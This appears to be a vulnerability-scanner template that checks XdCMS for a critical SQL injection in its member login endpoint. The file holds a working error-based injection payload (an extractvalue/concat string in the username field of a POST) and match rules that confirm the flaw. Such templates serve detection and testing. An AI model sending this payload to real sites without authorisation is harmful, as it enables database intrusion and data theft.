id: xdcms-sqli
brief:
    title: XdCMS - SQL Injection
    by: pikpikcu
    level: critical
    about: XdCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context o...
    label:
        - sqli
        - xdcms
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index.php?m=member&f=login_save'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: |
        username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+
      signs:
        - "on": word
          has:
            - 'Content-Type: text/html'
          in: header
          need: all
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
          need: all
        - "on": status
          status:
            - 200
